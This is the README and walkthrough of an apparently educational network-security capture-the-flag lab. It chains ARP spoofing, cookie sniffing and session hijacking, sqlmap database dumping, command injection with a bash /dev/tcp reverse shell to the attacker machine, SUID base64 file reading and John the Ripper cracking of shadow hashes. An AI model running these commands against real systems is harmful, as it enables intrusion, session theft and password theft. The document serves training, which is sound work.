# Network Security CTF

## Usage

Run the following docker commands

```
$ docker-compose build
$ docker-compose up -d
```

## Writeup

### Machines
* Web Application: http://127.0.0.1:8088
* Attacker: http://127.0.0.1:7681

### Goals
* Read the file "flag.txt"
* Steal the root password

## Scanning
Nmap, an acronym for "Network Mapper," is a widely used tool for scanning and analyzing computer networks. It is an open-source application that provides a wide range of features to discover devices, services running on them, and evaluate the security of a network. Here's a quick primer on how to scan a network with a /24 netmask using Nmap:

Nmap is a versatile tool that allows network administrators and security specialists to perform network scans to identify devices, services, and potential vulnerabilities within a network. To scan a network with a /24 netmask, we are actually trying to scan all devices in the same subnet. A /24 netmask implies that we are scanning IP addresses in a given class C, so 256 addresses (0 to 255).

To scan a network with Nmap and a /24 netmask, you can use the following command from a terminal:

```
nmap -sn 193.20.1.0/24
```

In this command:

* `nmap` is the application itself.
* `-sn` specifies to perform a "ping-scan" to identify live devices on the network without performing a full port scan.
* `192.168.1.0/24` represents the network we want to scan, with a /24 netmask. This will scan all IP addresses in the range 193.20.1.0 to 193.20.1.255.

The command will return a list of active IP addresses in the specified network, allowing you to identify devices running on them. Note that to perform a more in-depth scan to discover services running on these devices and open ports, you can extend the use of Nmap by including additional options in the command, such as specifying which ports to scan.

## Man In The Middle
A man-in-the-middle attack requires three players. There’s the victim, the entity with which the victim is trying to communicate, and the **man in the middle**, who’s intercepting the victim’s communications. Critical to the scenario is that the victim isn’t aware of the man in the middle.

It comes in two forms, one that involves physical proximity to the intended target, and another that involves malicious software, or malware. This second form is also called a **man-in-the-browser attack**.

### Types of man-in-the-middle attacks

Cybercriminals can use MITM attacks to gain control of devices in a variety of ways.
* **1) IP Spoofing**

By spoofing an IP address, an attacker can trick you into thinking you’re interacting with a website or someone you’re not, perhaps giving the attacker access to information you’d otherwise not share.

* **2) DNS Spoofing**

DNS spoofing is a technique that forces a user to a fake website rather than the real one the user intends to visit. If you are a victim of DNS spoofing, you may think you’re visiting a safe, trusted website when you’re actually interacting with a fraudster. The perpetrator’s goal is to divert traffic from the real site or capture user login credentials.

* **3) HTTP Spoofing**

When doing business on the internet, seeing “HTTPS” in the URL, rather than “HTTP” is a sign that the website is secure and can be trusted. In fact, the “S” stands for “secure.” An attacker can fool your browser into believing it’s visiting a trusted website when it’s not. By redirecting your browser to an unsecure website, the attacker can monitor your interactions with that website and possibly steal personal information you’re sharing.

* **4) SSL Hijacking**

In an SSL hijacking, the attacker uses another computer and secure server and intercepts all the information passing between the server and the user’s computer.

* **5) Email Hijacking**

Cybercriminals sometimes target email accounts of banks and other financial institutions. Once they gain access, they can monitor transactions between the institution and its customers. The attackers can then spoof the bank’s email address and send their own instructions to customers. This convinces the customer to follow the attackers’ instructions rather than the bank’s. As a result, an unwitting customer may end up putting money in the attackers’ hands.

* **6) ARP Spoofing**

In computer networking, ARP spoofing, ARP cache poisoning, or ARP poison routing, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network. Generally, the aim is to associate the attacker's MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead. 

## Cookie Stealing and Hijacking Session

**:warning: IN THIS CASE, THE ATTACKER IS ASSUMED TO BE CONNECTED ON THE SAME NETWORK OF WEB APPLICATION. :warning:**

With the previous scan we discovered the IP address of the web application and of another endpoint, with which it is probably communicating.

To carry out this attack it is necessary to enable ip forwarding with the systemcall:
```
sysctl -w net.ipv4.ip_forward=1
```
(The attacker machine has been properly configured and there is no need for this command)

Using this command, it's possible to check on which network interface the attacking machine receives communications:
```
ip a
```

Our purpose is to steal a possible session in order to access the service. To do this, we use the **arpspoof** command present in the **dsniff** suite of tools:
```
arpspoof -i eth0 -t 193.20.1.5 193.20.1.2 2> /dev/null &
arpspoof -i eth0 -t 193.20.1.2 193.20.1.5 2> /dev/null &
```

In this way, the attacker is getting in the way of the communication between the server and the victim endpoint. If he wasn't connected to the internal network, it would have been necessary to intercept communications between the gateway and the other nodes on the network.

Now that we are intercepting the traffic, we need to use a tool to be able to read the communication. On the attacker machine is pre-installed the tool **tcpdump**. If you're using your own machine, you can download it from here: 
* https://www.tcpdump.org/

To steal the session cookie, you can read the http packets' header using the following command:
```
tcpdump -i eth0 -s 0 -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'
```

* `tcp[((tcp[12:1] & 0xf0) >> 2):4]`: first determines the location of the bytes you're interested in (after the TCP header) and then selects the 4bytes we wish to match against.
* `0x47455420`: depicts the ASCII value of the characters 'G' 'E' 'T' ' '

In the output, you can notice that there is a cookie named **session**. If you're using **Firefox** right click on the application's login page and select **inspect**, after that select the **Storage** section and add a new cookie named "session" with the session value you've obtained before.

## SQL injection

SQL (Structured Query Language) Injection, mostly referred to as SQLI, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input form a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas.
This is why as well as SQLI being one of the oldest web application vulnerabilities, it also can be most damaging.

In this scenario, it is possible to search among the products in the database using an html form. You can see that this is a GET request by looking at the URL:

* http://193.20.1.2:5000/search?nome=mela

From the URL above, you can see that the results comes from the "nome" parameter in the query string. The web application needs to retreive the article from the database and may use an SQL statement that looks something like the following:
```sql
SELECT all FROM table WHERE nome=mela
```

You can assume that this query is to search for stored products of a table. Is there a way to explore the other tables?

### Union-Based SQL Injection

This type of injection utilises the `SQL UNION` operator alongside a `SELECT` statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

### SQLMap

It's an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

If you are using the attacking machine that was provided to you, sqlmap is already installed. Otherwise, you can download it here: https://github.com/sqlmapproject/sqlmap

To check if the "name" parameter is vulnerable it is necessary to set the session (previously stolen) to allow sqlmap to see the /search page, to do this you need to use the following command:

```
sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION"
```

* `-u`: Target Url
* `-p`: Testable parameter(s)
* `--cookie`: HTTP cookie header value

After that we can proceed to inspect the databases:

```
sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" --tables
```

* `--tables`: Enumerate DBMS database tables

It turns out that there is a database called "networkSecurity" with a table called "account". The last step is to see the contents of this table:

```
sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" -D networkSecurity -T account --dump
```

* `-D`: DBMS database to enumerate
* `-T`: DBMS database table(s) to enumerate
* `--dump`: Dump DBMS database table entries

## Command Injection

**Command Injection** is an attacck in wich the goal is execution of arbitrary commands on the host operating system via a vulnerable application. These attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system command are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

Having logged in with the admin credentials, you are redirected to the /admin page. You may notice a form that says "*Explore your File System*", using this feature the admin can navigate through the folders containing the source codes for the web application. It is possible to assume that the web application uses a function to launch commands that will be executed by the shell.
The command being executed probably looks something like this:
* `ls -l ` + input

The current goal is to find a way to execute malicious commands by taking advantage of possible poor input validation, to do this we can use the pipe command.

### Pipe Command
A pipe is an aspect of redirection i.e., transfer of any standard output to another target path which is commonly used in Unix and Linux-like operating systems in order to send the outputs of one process/command/program to another/program/command/process for any further processing. The Linux/Unix system enables stdout of a command to connect to stdin of other commands, which we can do by the pipe character `|`.

### && Operator in Linux

The Bash logical (&&) operator is one of the most useful commands that can be used in multiple ways, like you can use in the conditional statement or execute multiple commands simultaneously. Generally speaking, the logical operator is the one that is used to connect more than one expression and then provides the output based on their combined result.

These are just some of the possible ways to chain multiple commands, you can do an initial test with the *whoami* command:

```
ls -l | whoami
```

### Reverse Shell
To gain control over a compromised system, an attacker usually aims to gain interactive shell access for arbitrary command execution. With such access, they can try to elevate their privileges to obtain full control of the operating system. However, most systems are behind firewalls and direct remote shell connections are impossible. One of the methods used to circumvent this limitation is a reverse shell.

In a typical remote system access scenario, the user is the client and the target machine is the server. The user initiates a remote shell connection and the target system listens for such connections. With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the user, and the user’s computer listens for incoming connections on a specified port.

The primary reason why reverse shells are often used by attackers is the way that most firewalls are configured. Attacked servers usually allow connections only on specific ports. For example, a dedicated web server will only accept connections on ports 80 and 443. This means that there is no possibility to establish a shell listener on the attacked server. On the other hand, firewalls usually do not limit outgoing connections at all. Therefore, an attacker may establish a server on their own machine and create a reverse connection. All that the attacker needs is a machine that has a public (routable) IP address and a tool such as netcat to create the listener and bind shell access to it.

It is possible to have the server open a terminal to our attacking machine. To do this, you can open a shell to a remote address with a simple terminal command:

```
bash -i >& /dev/tcp/IP_ADDRESS/PORT
```

You need to listen on the attacking machine in order to accept the server connection. We use the netcat tool to do this:

```
nc -lnvp PORT (you can choose any free port)
```

Thanks to command injection, we can open a remote shell on our attacking machine by typing the command:

```
bash -c "bash -i >& /dev/tcp/193.20.1.4/PORT 0>&1"
```

In this case, the server does not use the **/bin/bash** shell by default, so you need to invoke it with the **-c** flag to specify which command it should execute. If everything went well, the server will get stuck loading the page, and a remote shell will open on your terminal.

## Privilege Escalation
At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:
* Execute any administrative command
* Resettings passwords
* Editing software configurations
* Bypassing access controls to compromise protected data
* Enabling persistence
* Changing the privilege of existing (or new) users

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or, in this case, just found a way to send commands using a low privileged account.

Shown below are some of the possible ways to get system information.

```
uname -a
```

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation

```
/proc/version
```

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

```
ps
```

The `ps` command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell. 

```
env
```

The env command will show environmental variables. The `PATH` variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

```
sudo -l
```

The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using sudo.

```
id
```

The id command will provide a general overview of the user’s privilege level and group memberships. It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

```
/etc/passwd
```

Reading the /etc/passwd file can be an easy way to discover users on the system. 

```
ifconfig
```


The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. 

```
netstat
```

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections. 

```
find
```

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in `find` command is useful and worth keeping in your arsenal.

### SUID
Much of Linux's privilege checks rely on checking users and file interactions. This is done with permissions. By now you know that files can have read, write and execute permissions. These are provided to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow you to run files with the permission level of the file owner or group owner, respectively.

You will notice these files have an `s` bit set showing their special permission level.

```
find / -type f -perm -04000 -ls 2>/dev/null
```

It will list files that have SUID or SGID bits set.

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

We can notice that `base64` command has the bit `s` set. As you can read at the following link:
* https://gtfobins.github.io/gtfobins/base64/#suid

It is possible to read files on which the admin user doesn't have access permissions by running:

```
base64 file | base64 -d
```

## Cracking Password
Linux systems use a password file to store accounts, commonly available as `/etc/passwd`. For additional safety measures, a shadow copy of this file is used which includes the passwords of your users. Or actually hashed password, for maximum security.

An example of a password entry in **/etc/shadow** may look like this:

*user1:$6$6Y/fI1nx$zQJj6AH9asTNfhxV7NoVgxByJyE.rVKK6tKXiOGNCfWBsrTGY7wtC6Cep6co9eVNkRFrpK6koXs1NU3AZQF8v/:16092:0:99999:7:::*

### 1) Username
The first field is the username of the particular account

### 2) Password hashing details + hashed password
The most important string is definitely the second one. It includes password details and consist of several parts:
* **$6** = SHA-512
* **$6Y/fI1nx$** = Salt and separators. The salt is a small string of characters to mix into the hashing function. Its goal is making it more difficult to perform certain password based attacks on the hashed password.
* **Long string of characters** = hashed password
* **Lengths**:
	* **$6** = SHA-512 with 86 characters
	* **$5** = SHA-256 with 43 characters
	* **$1** = MD5 with 22 characters

### 3) Last Changed
This number indicates when the password was last changed. The number does indicate the day number, starting from epoch date (1 Januari 1970).

### 4) Number of days before password can be changed
This field defines how long it takes before the password can be changed. In our case zero, so it can be changed now.

### 5) Number of days till required password change
Another pretty self-explanatory field, stating how long is left (in days), before a password change is required. A great option to force password changes.

### 6) Warning threshold in days
In line with previous field it describes the number of days till a warning will be giving. In this example it is a week.

### 7) Expire data
Also stored in days, describing when the account was expired (from epoch date).

### 8) Reserved field
Usually not used by Linux distributions.

### File Permission
The **/etc/shadow** file should be owned by the root user, with usually shadow as group owner. This file should not be world-readable, therefore 640 or 400 would be an appropriate file permission.

### John The Ripper - Password Cracker
John The Ripper (JTR) is one of the most popular password cracking tools available in most Penetration testing Linux distributions like Kali Linux, Parrot OS, etc. John The Ripper password cracking utility brags of a user-friendly command-line interface and the ability to detect most password hash types. 

Password cracking with JtR is an iterative process. A word is selected from the wordlist, hashed with the same hash algorithm used to hash the password, and the resulting hash is compared with the password hash. If they match, then the word picked from the wordlist is the original password. If they don't match, JtR will pick another word to repeat the same process until a match is found. And as you guessed it! This process can take some time if the password used was complex. John the Ripper supports most encryption technologies found in UNIX and Windows systems.

If you are using the attacking machine that was provided to you, JtR is already installed. Otherwise, you can download it here: https://github.com/openwall/john

Once you have discovered the passwd and shadow files, you can try to find out the passwords of various users, especially the root user.

First use the unshadow command to combines the /etc/passwd and /etc/shadow files so John can use them

```
unshadow passwd shadow > unshadow
```

On a normal system you’ll need to run unshadow as root to be able to read the shadow file. So login as root or use old good sudo / su command under Debian / Ubuntu Linux.

To use John, you just need to supply it a password file created using unshadow command along with desired options. If no mode is specified, john will try “single” first, then “wordlist” and finally “incremental” password cracking methods.

The "rockyou" dictionary is already present on the attacker machine with some possible passwords to try. Also, in the shadow file we can see the **$1** symbol, this means that it has been hashed with MD5.

```
john --wordlist=path/to/wordlist --format=MD5crypt unshadow
```

* `--wordlist`: Wordlist mode, read words from FILE or stdin
* `--format`: Force the hash of the specified type

This procedure will take its own time. To see the cracked passwords, enter:

```
john --show unshadow
```
* `--show`: Show cracked passwords

If the root password is present in the dictionary used, it will be shown on the screen.

